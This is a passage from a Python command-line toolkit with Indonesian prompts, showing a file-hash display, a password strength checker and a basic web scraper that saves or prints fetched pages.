                print(f"{Fore.YELLOW}[*] SHA-1:{Style.RESET_ALL} {hashlib.sha1(data).hexdigest()}")
                print(f"{Fore.YELLOW}[*] SHA-256:{Style.RESET_ALL} {hashlib.sha256(data).hexdigest()}")
                print(f"{Fore.YELLOW}[*] SHA-512:{Style.RESET_ALL} {hashlib.sha512(data).hexdigest()}")
            else:
                print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal membaca file: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Password Strength Checker
def password_strength_checker():
    print(f"\n{Fore.GREEN}[*] Mode: Password Strength Checker{Style.RESET_ALL}")
    password = input(f"{Fore.YELLOW}[?] Masukkan password: {Style.RESET_ALL}")
    
    strength = 0
    feedback = []
    
    # Panjang password
    if len(password) >= 12:
        strength += 2
        feedback.append(f"{Fore.GREEN}[+] Panjang password baik (>= 12 karakter){Style.RESET_ALL}")
    elif len(password) >= 8:
        strength += 1
        feedback.append(f"{Fore.YELLOW}[!] Panjang password cukup (8-11 karakter){Style.RESET_ALL}")
    else:
        feedback.append(f"{Fore.RED}[-] Panjang password terlalu pendek (< 8 karakter){Style.RESET_ALL}")
    
    # Huruf besar dan kecil
    if any(c.isupper() for c in password) and any(c.islower() for c in password):
        strength += 1
        feedback.append(f"{Fore.GREEN}[+] Menggunakan huruf besar dan kecil{Style.RESET_ALL}")
    else:
        feedback.append(f"{Fore.RED}[-] Gunakan kombinasi huruf besar dan kecil{Style.RESET_ALL}")
    
    # Angka
    if any(c.isdigit() for c in password):
        strength += 1
        feedback.append(f"{Fore.GREEN}[+] Mengandung angka{Style.RESET_ALL}")
    else:
        feedback.append(f"{Fore.RED}[-] Tambahkan angka untuk meningkatkan keamanan{Style.RESET_ALL}")
    
    # Karakter khusus
    special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?~"
    if any(c in special_chars for c in password):
        strength += 1
        feedback.append(f"{Fore.GREEN}[+] Mengandung karakter khusus{Style.RESET_ALL}")
    else:
        feedback.append(f"{Fore.RED}[-] Tambahkan karakter khusus untuk meningkatkan keamanan{Style.RESET_ALL}")
    
    # Kata umum
    common_passwords = ["password", "123456", "qwerty", "admin", "welcome"]
    if password.lower() in common_passwords:
        strength = 0
        feedback.append(f"{Fore.RED}[-] Password termasuk dalam daftar password umum yang mudah ditebak{Style.RESET_ALL}")
    
    # Tampilkan hasil
    print("\n[ HASIL PENGUJIAN ]")
    for item in feedback:
        print(item)
    
    print(f"\n{Fore.YELLOW}[*] Skor kekuatan password: {strength}/5{Style.RESET_ALL}")
    
    if strength == 5:
        print(f"{Fore.GREEN}[+] Password sangat kuat!{Style.RESET_ALL}")
    elif strength >= 3:
        print(f"{Fore.YELLOW}[!] Password cukup kuat, tetapi masih bisa ditingkatkan{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Password lemah, sangat disarankan untuk menggunakan password yang lebih kuat{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Web Scraper
def web_scraper():
    print(f"\n{Fore.GREEN}[*] Mode: Web Scraper{Style.RESET_ALL}")
    url = input(f"{Fore.YELLOW}[?] Masukkan URL: {Style.RESET_ALL}")
    
    try:
        print(f"{Fore.BLUE}[*] Mengambil data dari {url}...{Style.RESET_ALL}")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output (kosongkan untuk tampilkan di layar): {Style.RESET_ALL}")
            
            if output_file:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print(f"{Fore.GREEN}[+] Data berhasil disimpan ke {output_file}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.CYAN}[ DATA ]{Style.RESET_ALL}")
                print(response.text[:1000] + "...")  # Tampilkan hanya 1000 karakter pertama
        else:
            print(f"{Fore.RED}[!] Gagal mengambil data. Status code: {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Main function
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program dihentikan oleh pengguna{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
